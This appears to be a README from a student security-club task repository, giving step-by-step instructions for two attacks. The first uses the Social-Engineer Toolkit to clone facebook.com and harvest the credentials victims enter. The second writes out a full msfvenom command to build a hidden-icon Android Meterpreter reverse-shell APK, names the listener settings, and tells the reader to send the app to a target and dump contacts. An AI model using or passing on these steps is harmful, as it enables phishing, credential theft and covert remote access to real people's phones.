# task_12/readme_req
  - Create a phishing web page of https://www.facebook.com/ . Credentials entered by the target should be available on the host machine.
  - Make an android payload (.apk file) to dump target’s contact info remotely, using metasploit

# 1. Create a phishing web page of https://www.facebook.com/ . Credentials entered by the target should be available on the host machine.
using `social-engineer-toolkit` ==> ["https://github.com/trustedsec/social-engineer-toolkit"] to create the phishing site for the target
<img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/1-set.PNG" alt="default" width="600" >

## steps:
  1. select `1) Social-Engineering Attacks` to start a Social-Engineering Attack 
  2. select `2) Website Attack Vectors` to crete phishing site
  3. select `3) Credential Harvester Attack Method` to colect user Credentials
  4. select `2) Site Cloner` to clone 'facebook.com'
    - enter the IP address (local or public according to your network) 
    - enter site url
<img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/web-results.PNG" alt="default" width="700" >

## results
<img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/result.PNG" alt="default" width="700" >

### we can also use blackeye here ["https://github.com/An0nUD4Y/blackeye"]  😎😎
reference - ["https://medium.com/@leandro.almeida/setoolkit-fake-facebook-site-e0b21fb08a50"]

----------
----------
----------

# 2. Make an android payload (.apk file) to dump target’s contact info remotely, using metasploit

## steps:
  1. open terminal and start msfconsole
  2. run to create payload `msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidWakeLock=true LHOST=eth0 LPORT=6996 -f raw -o TechnojamHack.apk` to create apk file 
  3. send the app to the target 
  4. for listening for use 
    - use exploit/multi/handler
    - set PAYLOAD android/meterpreter/reverse_tcp
    - set LHOST eth0
    - set LPORT 6996
    - exploit
  5. wait for the target to install the app this app will not show in the home app list 
    <img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/2-results2.PNG" alt="default" width="700" >
  6. we can use lifelong script to keen running the session  

reference - ["https://www.hackers-arise.com/post/2018/07/06/metasploit-basics-part-13-exploiting-android-mobile-devices"]